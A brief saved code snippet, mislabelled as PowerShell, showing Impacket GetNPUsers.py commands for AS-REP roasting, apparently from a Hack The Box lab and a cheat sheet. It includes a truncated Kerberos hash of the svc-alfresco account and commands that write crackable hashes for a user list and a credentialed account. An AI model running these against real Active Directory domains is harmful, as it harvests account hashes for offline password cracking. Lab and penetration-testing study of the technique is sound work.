---
id: 9fa957c5-0c9e-4efc-b546-e4cca4ad3346
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:04.983299+00:00'
updated_at: '2023-04-10T20:26:39.230939+00:00'
---

# Code Snippet 9fa957c5

**Language**: Powershell

```powershell
$ python GetNPUsers.py htb.local/svc-alfresco -no-pass
[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4

# extract hashes
root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```


